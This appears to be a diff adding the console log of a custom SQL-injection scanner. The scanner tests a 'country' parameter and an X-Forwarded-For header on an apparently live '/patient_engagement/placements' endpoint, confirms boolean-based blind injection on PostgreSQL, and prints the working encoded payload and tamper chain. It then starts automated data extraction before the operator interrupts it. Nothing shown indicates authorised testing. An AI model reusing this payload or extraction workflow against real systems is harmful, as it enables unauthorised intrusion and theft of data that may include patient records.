+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#31 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#35)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#89)
+    [B-bool] [PostgreSQL] 'country' req#40 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#32)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#90)
+    [B-bool] [PostgreSQL] 'country' req#23 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#36 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#91)
+[*]    Wasserstein comparison probe (param='country' req#24)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#92)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#93)
+[*]    Wasserstein comparison probe (param='country' req#37)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#94)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#95)
+[*]    Wasserstein comparison probe (param='country' req#41)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#96)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#35 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#38 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#36)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#97)
+[*]    Wasserstein comparison probe (param='country' req#39)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#98)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#99)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#100)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#37 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#40 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#101)
+[*]    Wasserstein comparison probe (param='country' req#41)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#102)
+    [B-bool] [PostgreSQL] 'country' req#43 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#44)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#103)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#38)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#104)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#105)
+    [B-bool] [PostgreSQL] 'country' req#28 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#29)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#106)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#107)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#39 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#40)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#108)
+    [B-bool] [PostgreSQL] 'country' req#43 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#30 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#46 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#44)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#109)
+[*]    Wasserstein comparison probe (param='country' req#47)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#110)
+[*]    Wasserstein comparison probe (param='country' req#31)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#111)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#41 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#42)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#112)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#113)
+    [B-bool] [PostgreSQL] 'country' req#48 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#114)
+[*]    Wasserstein comparison probe (param='country' req#49)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#115)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#116)
+    [B-bool] [PostgreSQL] 'country' req#46 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#117)
+[*]    Wasserstein comparison probe (param='country' req#47)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#118)
+    [B-bool] [PostgreSQL] 'country' req#50 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#44 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#45)
+[*]   [Wasserstein] dist=0.6841 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#119)
+[*]    Wasserstein comparison probe (param='country' req#51)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#120)
+    [B-bool] [PostgreSQL] 'country' req#34 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#48 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#35)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#121)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#122)
+    [B-bool] [PostgreSQL] 'country' req#52 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#49)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#123)
+    [B-bool] [PostgreSQL] 'country' req#36 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#47 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#53)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#124)
+[*]    Wasserstein comparison probe (param='country' req#37)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#125)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#48)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#126)
+    [B-bool] [PostgreSQL] 'country' req#50 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#51)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#127)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#128)
+    [B-bool] [PostgreSQL] 'country' req#38 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#39)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#129)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#130)
+    [B-bool] [PostgreSQL] 'country' req#52 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#131)
+    [B-bool] [PostgreSQL] 'country' req#40 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#53)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#132)
+[*]    Wasserstein comparison probe (param='country' req#41)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#133)
+    [B-bool] [PostgreSQL] 'country' req#57 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#49 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#134)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#135)
+[*]    Wasserstein comparison probe (param='country' req#58)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#136)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#137)
+    [B-bool] [PostgreSQL] 'country' req#43 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#138)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#50)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#139)
+    [B-bool] [PostgreSQL] 'country' req#59 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#60)
+[*]   [Wasserstein] dist=0.6841 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#140)
+    [B-bool] [PostgreSQL] 'country' req#57 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#58)
+[*]   [Wasserstein] dist=0.0195 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#141)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#142)
+[*]    Wasserstein comparison probe (param='country' req#44)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#143)
+    [B-bool] [PostgreSQL] 'country' req#59 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#60)
+[*]   [Wasserstein] dist=0.6841 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#144)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#51 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#145)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#146)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#147)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#148)
+    [B-bool] [PostgreSQL] 'country' req#46 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#149)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#52)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] testing 'PostgreSQL AND boolean-based blind' (param='X-Forwarded-For' req#150)
+[*]    Wasserstein comparison probe (param='country' req#47)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0195 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'PostgreSQL AND boolean-based blind' (param='country' req#151)
+    [B-bool] [PostgreSQL] 'country' req#64 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#63 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#64)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6795, threshold=0.30)  accepting boolean detection
+[*] Running PCV on B→B detection (PostgreSQL)...
+[*]    Wasserstein comparison probe (param='country' req#65)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.30  not confirmed
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2698 → testing 540 payloads
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2698 → testing 540 payloads
+[*] [diag] _try_technique: tech=B dbms=PostgreSQL templates=2698 → testing 540 payloads
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] order_by: sim_t=1.000 sim_f=0.500 gap=0.500 need=0.250  CONFIRMED (1/6)
+[+] [CTX-bool] order_by: strong gap=0.500 (≥ 0.500 = 2× threshold) — skipping multi-probe (2× Wasserstein-confirmed gap is self-sufficient; multi-probe fails from page noise not FP)
+    [CTX-bool] multi-probe skipped — strong gap=0.500 (≥ 0.500 = 2× threshold, Wasserstein already confirmed)
+[*] Running PCV on B→B detection (PostgreSQL)...
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*]     Check A (body canary): PASS  via SUBSTRING (structural fallback)+LENGTH (structural fallback) gap=0.500
+[*]     Check C (error fingerprint): FAIL ()
+[*]     Check D (header diff): PASS  1 diffs: content-length
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]   [PCV] Result: CONFIRMED  header diff (1) + body canary (SUBSTRING (structural fallback)+LENGTH (structural fallback))
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [B] PostgreSQL  injection verified!
+[*] [MultiVote] Param 'country' voted confidence: 100% (votes: {'B': 1.0})
+
+[!!] SQL injection confirmed!
+    Parameter : 'country'
+    URL       : /patient_engagement/placements?country=fr&variant=desktop
+    Technique : B
+    DBMS      : PostgreSQL
+    Bypass    : novel_encoding_unknown
+    Confidence: 100%
+    Payload   : 'fr%03%03AND%038645=(/*!SELECT*/%038645)%03--%03vnt'
+    Requests  : 64
+
+[+] Vulnerability confirmed  param='country' technique=B dbms=PostgreSQL
+[+] BG injection confirmed  primary scan cancelled for fast extraction
+[+] Injection confirmed  cancelled remaining background scans
+[*] Collecting background surface results...
+[+] Injection confirmed  cancelled 2 background tasks immediately
+[*] Injection confirmed on 'country'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='country'
+[+] [PATCH] INJECTION FOUND: country [B] PostgreSQL!
+[*] Extraction started for 'country'
+[+] [BG] Confirmed: country [B] PostgreSQL
+[+] [BGExtraction] Queued country [B] PostgreSQL for extraction
+[+] Minimising payload: 534 chars  ?
+[+] [V25-Extract] Inline boolean oracle wired (tech='B') — extraction can proceed despite ConditionalErrorOracle calibration failure
+[+] --- Auto-extraction starting ---
+[+] [Inference] Detection payload: fr%03%03AND%038645=(/*!SELECT*/%038645)%03--%03vnt
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: ['pg_dollar_quote', 'unicode_fullwidth']
+[+] [Inference] Template (boolean-append): fr%03%03AND%038645=(/*!SELECT*/%038645)%03--%03vnt AND [INFERENCE]
+[+] [Inference] No sleep value in detection payload — falling back to 0.5s
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=0.5s)...
+[+] [Inference] Calibration 1: TRUE=2980ms FALSE=239ms margin=2741ms
+[+] [Inference] Best margin: 2741ms
+[+] [Inference] Body length differs but too small (402B = 72.2% on 557B page)  dynamic noise, not oracle
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] CDN-cached response (205ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] Minimised: 534  416 chars (30 probes)
+[+]  'country': B [WHERE_STRING] bypass=novel_encoding_unknown conf=100%
+[+] [PATCH-5] Second injection point param='country' technique=B dbms=PostgreSQL — logging only, extraction already active/done (Req 5).
+[!] [ExtractionGuard] Extraction already running on 'country@PostgreSQL@PATCH'  blocking parallel extraction of 'country' (Issue 5 fix: never two extractions)
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete before exiting...
+[+] [Inference] CDN-cached response (217ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (217ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (209ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (215ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+^CTraceback (most recent call last):
+  File "/home/kali/Desktop/sqlreaper_v214.py", line 176224, in <module>
+    _main_thread.join()
+    ~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/threading.py", line 1094, in join
+    self._handle.join(timeout)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^
+KeyboardInterrupt
+^CTraceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
+    _thread_shutdown()
+KeyboardInterrupt: 
